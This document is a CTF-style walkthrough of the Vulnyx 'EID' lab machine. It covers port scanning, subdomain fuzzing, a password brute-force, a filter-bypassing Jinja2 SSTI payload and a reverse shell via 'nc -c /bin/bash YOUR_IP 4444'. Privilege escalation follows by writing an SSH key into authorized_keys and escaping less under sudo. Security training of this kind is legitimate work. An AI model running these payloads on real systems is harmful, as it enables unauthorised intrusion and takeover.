---
title: "EID - Vulnyx"
summary: "Difficulty: Medium 🟠"
---

<style>

h6 {
  text-align: center;
  font-style: italic;
  font-weight: normal;
  position: relative;
  top: -10px;
}

img {
    display: flex !important;
    margin: 0 auto !important;
    justify-content: center !important;
    border-radius: 14px;
    border: 2px solid #4a90e2;
    box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
    transition: box-shadow 0.3s ease, transform 0.3s ease;
}
img:hover {
    box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
    transform: scale(1.03);
}

</style>

[Machine Link](https://vulnyx.com/#EID)

To begin, we perform a **quick port scan** with [**Nmap**](https://nmap.org/) to see **which ports are open**.

```
sudo nmap -sS --min-rate 4500 -n -Pn 192.168.1.131 -vvv
```

![1](/images/writeups/eid/1.png)

Once we know that **ports 22 and 80 are open**, we run a more **detailed scan on those ports** and save the output to a file called ***target***.

```
nmap -sCV -p22,80 -n -Pn 192.168.1.131 -oN target
```

![2](/images/writeups/eid/2.png)

When trying to access the website hosted by the victim machine, our machine cannot resolve the domain, so it doesn't know how to reach it.

![3](/images/writeups/eid/3.png)

To fix that, we add the domain to ***/etc/hosts*** with its corresponding **IP**.

```
192.168.1.131   3id.nyx
```

Now **we can access the website** without problems.

![4](/images/writeups/eid/4.png)

After looking through the different sections, we don’t find any obvious way to continue, so we use [**Wfuzz**](https://github.com/xmendez/wfuzz) to see if any **subdomains** exist.

```
wfuzz -u http://3id.nyx/ --hw=12 -H "Host: FUZZ.3id.nyx" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

![5](/images/writeups/eid/5.png)

We find the subdomain `beta.3id.nyx`.

> 📝 **NOTE:** We also add this subdomain to **/etc/hosts**.

When accessing the subdomain `beta.3id.nyx`, we see some **Beta Testing Notes** for **EidGreetings**, and there we find a user called **alouch**.

![6](/images/writeups/eid/6.png)

Since the main page had a login, we can try a **dictionary attack** against the site's web form using [**Wfuzz**](https://github.com/xmendez/wfuzz) again.

```
wfuzz -c -z file,/usr/share/wordlists/rockyou.txt --hl=217 -d "username=alouch&password=FUZZ" http://3id.nyx/login
```

![7](/images/writeups/eid/7.png)

We find the **password** for the user **alouch**.

![8](/images/writeups/eid/8.png)

There is a new section called **Shared Greetings** that contains messages sent to us, and among them we see that the **/greet/share** endpoint has a parameter named `template` which is vulnerable to [**SSTI**](https://conper.xyz/cybersecurity/hacking/webvulns/#ssti-server-side-template-injection).

![9](/images/writeups/eid/9.png)

```
http://3id.nyx/greet/share?id=1&template={{7*'7'}}
```

![10](/images/writeups/eid/10.png)

When trying to run various **payloads**, **the site blocks them** because it has a filter that forbids functions like: **`read`**, **`os`**, **`open`**, **`popen`**, etc.

![11](/images/writeups/eid/11.png)

We bypass the forbidden words: **`read`**, **`open`**, **`os`**, **`system`**, **`popen`**, **`app`**, **`import`**...
To exploit it, we reach **`os`** via the **subprocess.Popen** class which is at position **[262]** in an internal system list, without using **`import`** or typing any blocked words, and run the **id** command:

```
{{ [][].__class__.__base__.__subclasses__()[262].__init__.__globals__["o".__add__("s")]|attr("pop"+"en")("id")|attr("re"+"ad")() }}
```

![12](/images/writeups/eid/12.png)

Since we have **RCE**, we execute a **Reverse Shell** to access the victim machine.

```
http://3id.nyx/greet/share?id=1&template={{[][].__class__.__base__.__subclasses__()[262].__init__.__globals__["o".__add__("s")]|attr("pop"+"en")("nc -c /bin/bash YOUR_IP 4444")|attr("re"+"ad")()}}
```

## Privilege escalation to Alouch

Once inside, if we look at the permissions of the file ***/home/alouch/.ssh/authorized_keys*** we see it has an **ACL** set that shows the **www-data** user **has write permissions on it**. That means we can copy our machine’s **public SSH key** and paste it there to allow **SSH** access as user **alouch**.

![13](/images/writeups/eid/13.png)

```
echo "YOUR_PUBLIC_SSH_KEY" > /home/alouch/.ssh/authorized_keys
```

Now, as user **alouch** we can obtain the **User Flag**.

## Privilege escalation to Root

Running `sudo -l` shows we can execute a script called ***maintenance_cleanup.sh*** as **root** without supplying a password.

![14](/images/writeups/eid/14.png)

```bash
#!/bin/bash
# EidGreetings System Log Maintenance and Review Script

DEFAULT_LOG="/var/log/eidgreetings/app.log"
VIEW_FILE="${1:-$DEFAULT_LOG}"

if [ ! -f "$VIEW_FILE" ]; then
    echo "Error: File '$VIEW_FILE' not found."
    exit 1
fi

# The script uses 'less' to view the file, which can be escaped
/usr/bin/less "$VIEW_FILE"
```
<h6>Contents of maintenance_cleanup.sh</h6>

This script **opens the app log** with **`less`**. If the file doesn't exist, it notifies you and exits. The file exists (although it is empty), but that doesn't prevent us from exploiting the vulnerability: if you run the script with **sudo**, **`less`** runs as **root** and inside it you can simply type **`!/bin/bash`** to **spawn a shell as root**.

```
sudo /opt/eid_scripts/maintenance_cleanup.sh
```

![15](/images/writeups/eid/15.png)

We obtain the **Root Flag** and **machine pwned**!!
